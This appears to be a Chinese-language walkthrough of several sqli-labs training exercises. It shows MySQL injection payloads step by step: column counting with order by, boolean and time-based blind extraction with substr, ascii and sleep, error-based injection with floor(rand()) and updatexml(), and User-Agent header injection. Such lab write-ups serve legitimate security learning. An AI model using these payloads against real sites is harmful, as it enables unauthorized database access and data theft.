Less-1#

判断注入类型#

根据提示在url后键入?id=1，页面显示正常。再键入单引号页面报错，再键入mysql注释符--+，页面显示正常，可断定存在字符型注入。

判断字段数#

使用order by来判断字段数。

?id=1' order by 4 --+ //页面报错

?id=1' order by 3 --+ //页面显示正常

可断定其字段数为3，且sql查询语句可能为：$sql="SELECT * FROM xxx WHERE id = '$id' LIMIT 0,1 "

爆数据库名、表名、字段名#

根据mysql的特性，利用informaton_schema 进行注入。

猜库

select schema_name from information_schema.schema

猜库中的表

select table_name from information_schema.tables where table_shcema="xxx"

猜表中列

select column_name from information_schema.columns where table_name="xxx"

猜段

select *** from ***

Less-1结束。

判断数据库长度#

先使用length()函数判断当前数据库长度。

?id=1' and length(database())=*--+，*为数字，当为8时，页面显示正常。故判断当前数据库长度为8。

猜解数据库字符#

使用left()函数判断当前数据库第一位的值。

?id=1' and left(database(),1)<'s' --+ //页面显示不正常

?id=1' and left(database(),1)<'t' --+ //页面显示正常

故判断当前数据库第一位为’s'。

也可以使用burpsuit抓包，爆破。当然也可以使用二分法😂

最后一次猜剩下的字符即可，如?id=1' and left(database(),2)='se' --+页面显示正常。

判断表的个数#

上一步得到数据库名为“security”，接着手注出该数据库下存在多少个数据表。

?id=1' and (select count(table_name) from information_schema.tables where table_schema='security')=1 --+

通过修改最后的数字，根据页面来判断表的个数，当=4时，页面出现You are in字样，故断定该数据库下有4张表。

猜解表的长度#

猜解到有4张表，接下来猜解表的长度。

?id=1' and *=length((select table_name from information_schema.tables where table_schema='security' limit 0,1)) --+

*为猜测表长度的数字，当为6时，页面显示you are in，故判断第一张表的长度为6

猜解第四张表（users）#

利用ascii()和substr()猜解表的字符。

substr(string string,num start,num length); //string为字符串；start为起始位置；length为长度(mysql中的start是从1开始的。)

ascii() //返回字符串str的最左面字符的ASCII代码值。

?id=1' and *=(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1) ,1,1))) --+

可以利用burp辅助爆破，如下。当*值为117时，页面显示you are in，故判断第四张表（user）的第一个字符为’u'。

按照这个套路依旧爆破出字段即可。

Less-9#

这题不管是正常的url还是带有恶意sql语句的url页面都会返回you are in字样，不能通过页面变化来判断是否存在注入，于是尝试使用sleep()函数。

在mysql中，if(expr,v1,v2)，mysql会判断expr，从而返回v1或者v2，如1>5时值为false，则返回v2。

这里需要注意一点：Time盲注时，穷举会比二分查找快很多。Bool盲注时，则二分查找更快一些。

故这题的payload可以是：

?id=1' and if(ascii(substr(database(),1,1))=1,1,sleep(2))--+

Less-11#

报错注入在之前几次面试的时候被问到过，作为基本的sql注入类型，还是需要对他有了解的。囧rz

报错注入主要设计的函数有：

  1. rand() //随机函数
  2. floor() //取整函数
  3. count() //汇总函数
  4. group by //分组

报错注入的原理是什么呢？是当在一个聚合函数，比如COUNT函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。

SELECT CONCAT((SELECT database()),floor(rand()*2)) as a from test group by a;

上面为常见的报错注入payload。

CONCAT((SELECT database()),floor(rand()*2)) as a是将查询得到的列名重名为a。

group by则是将a这个列的数据，将查询出来相同的数据分到一个组里面。

于是该题的payload可以是下面这样子

uname=admin&passwd=1' union select count(*),concat((select version()),floor(rand(0)*2)) as a from information_schema.columns group by a#

亦或者利用updatexml()函数，把不是XPATH语法的内容通过报错，返回到页面：

爆数据库：uname=1&passwd=1' union select 1,updatexml(1,concat(0x7e,(select database()),0x7e),1)#

爆数据表：uname=1&passwd=1' union select 1,updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)#

爆字段名：uname=1&passwd=1' union select 1,updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='emails' limit 0,1),0x7e),1)#

爆值：uname=1&passwd=1' union select 1,updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)#

Less-18#

进来之后输入admin/admin登录，明显能看到页面下面有返回当前的agent。判断为基于错误POST_User-Agent请求头注入。

经过多次测试发现，只有当username和password都是正确的前提下，登陆成功后回显uagent，并将uagent、IP、username插入到security数据库的uagents表的uagent、ip_address、username三个字段中，所以我们针对agent进行测试。

尝试让mysql报错，使用payloadgsh3ll' updatexml(1,concat(0x7e,(database()),0x7e),1) #，能看到报错信息：

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'updatexml(1,concat(0x7e,(database()),0x7e),1) #', '172.16.152.1', 'admin')' at line 1

猜测其插入数据库的语句为：

INSERT INTO table_name ('uagent','ip_address','username') VALUES ('$uagent','$IP','$uname')

于是便可以构造payload了，因为最后有个括号，我们需要进行闭合，故payload可以这么写：

gsh3ll' and updatexml(1,concat(0x7e,(database()),0x7e),0),'','') #，成功注入。
